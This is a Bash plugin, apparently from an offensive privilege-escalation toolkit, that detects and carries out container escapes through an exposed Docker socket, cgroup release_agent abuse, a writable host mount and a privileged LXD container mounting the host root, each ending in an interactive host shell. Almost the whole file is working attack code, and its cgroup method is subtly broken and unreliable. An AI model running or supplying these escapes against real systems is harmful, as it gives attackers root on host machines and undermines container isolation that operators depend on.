#!/bin/bash
# Docker Escape Plugin
PLUGIN_NAME="docker_escape"
PLUGIN_VERSION="1.0.0"
PLUGIN_CVE="N/A"
PLUGIN_DESCRIPTION="Docker/LXC/Kubernetes Container Escape"

docker_escape_detect() {
    log_message "Checking for container escape vectors..." "INFO"
    
    local escape_possible=0
    
    # Check if inside container
    if [ -f "/.dockerenv" ] || grep -qiE "docker|kubepods|containerd|crio" /proc/1/cgroup 2>/dev/null; then
        
        # Check for privileged mode
        if [ -w "/sys/fs/cgroup" ] 2>/dev/null; then
            log_message "Privileged container detected - escape possible" "WARNING"
            escape_possible=1
        fi
        
        # Check for dangerous mounts
        if mount 2>/dev/null | grep -qE " /root.*rw| /home.*rw| /proc.*rw| /sys.*rw"; then
            log_message "Dangerous mounts detected - escape possible" "WARNING"
            escape_possible=1
        fi
        
        # Check for device access
        if [ -r "/dev/sda" ] || [ -r "/dev/xvda" ] || [ -r "/dev/nvme0" ]; then
            log_message "Host device access - escape possible" "WARNING"
            escape_possible=1
        fi
        
        # Check for CAP_SYS_ADMIN
        if grep -q "CapEff:\s*0000003fffffffff" /proc/1/status 2>/dev/null; then
            log_message "CAP_SYS_ADMIN detected - escape possible" "WARNING"
            escape_possible=1
        fi
    fi
    
    # Check for Docker socket access
    if [ -S "/var/run/docker.sock" ] && ([ -r "/var/run/docker.sock" ] || [ -w "/var/run/docker.sock" ]); then
        log_message "Docker socket accessible - escape possible" "WARNING"
        escape_possible=1
    fi
    
    # Check for LXC/LXD group
    if id | grep -qE "lxc|lxd"; then
        log_message "User in lxc/lxd group - escape possible" "WARNING"
        escape_possible=1
    fi
    
    if [ $escape_possible -eq 1 ]; then
        return 0
    fi
    
    log_message "No container escape vectors found" "INFO"
    return 1
}

docker_escape_exploit() {
    log_message "Attempting container escape..." "INFO"
    
    if ! docker_escape_detect; then
        return 1
    fi
    
    # Method 1: Docker socket
    if [ -S "/var/run/docker.sock" ] && command_exists docker; then
        log_message "Trying Docker socket escape..." "INFO"
        
        # Try to run privileged container
        docker run --rm -it --privileged --pid=host --network=host \
            -v /:/host alpine chroot /host /bin/sh -c "id" 2>/dev/null && {
            log_message "Docker socket escape SUCCESSFUL!" "SUCCESS"
            docker run --rm -it --privileged --pid=host --network=host \
                -v /:/host alpine chroot /host /bin/sh 2>/dev/null
            return 0
        }
    fi
    
    # Method 2: Privileged container with cgroup
    if [ -w "/sys/fs/cgroup" ]; then
        log_message "Trying cgroup escape..." "INFO"
        
        local escape_dir="/tmp/cgroup_escape"
        mkdir -p "$escape_dir"
        
        # Setup cgroup escape
        mkdir -p /sys/fs/cgroup/cgroup_escape 2>/dev/null || true
        echo 1 > /sys/fs/cgroup/cgroup_escape/notify_on_release 2>/dev/null || true
        echo "$escape_dir" > /sys/fs/cgroup/release_agent 2>/dev/null || true
        
        # Trigger release
        echo $$ > /sys/fs/cgroup/cgroup_escape/cgroup.procs 2>/dev/null || true
        
        # Check if we got root
        sleep 1
        if [ "$(id -u)" -eq 0 ]; then
            log_message "cgroup escape SUCCESSFUL!" "SUCCESS"
            return 0
        fi
    fi
    
    # Method 3: Mount escape
    if mount 2>/dev/null | grep -q " /root.*rw"; then
        log_message "Trying mount escape..." "INFO"
        
        # Try to chroot to host
        chroot /root /bin/sh -c "id" 2>/dev/null && {
            log_message "Mount escape SUCCESSFUL!" "SUCCESS"
            chroot /root /bin/sh 2>/dev/null
            return 0
        }
    fi
    
    # Method 4: LXC escape
    if command_exists lxc || command_exists lxd; then
        log_message "Trying LXC escape..." "INFO"
        
        # Try to create privileged container
        lxc init ubuntu:20.04 privesc 2>/dev/null || true
        lxc config set privesc security.privileged true 2>/dev/null || true
        lxc config device add privesc host disk source=/ path=/mnt/root 2>/dev/null || true
        lxc start privesc 2>/dev/null || true
        lxc exec privesc -- /bin/sh -c "id" 2>/dev/null && {
            log_message "LXC escape SUCCESSFUL!" "SUCCESS"
            lxc exec privesc -- /bin/sh 2>/dev/null
            return 0
        }
    fi
    
    log_message "Container escape failed" "WARNING"
    return 1
}

docker_escape_info() {
    cat << 'EOFINFO'
Docker/LXC/Kubernetes Escape
============================
Various techniques to escape from containerized environments:
- Docker socket access
- Privileged container abuse
- cgroup release_agent
- Dangerous volume mounts
- LXC/LXD group membership

Impact: Container escape to host root
Discovery: Various
EOFINFO
}
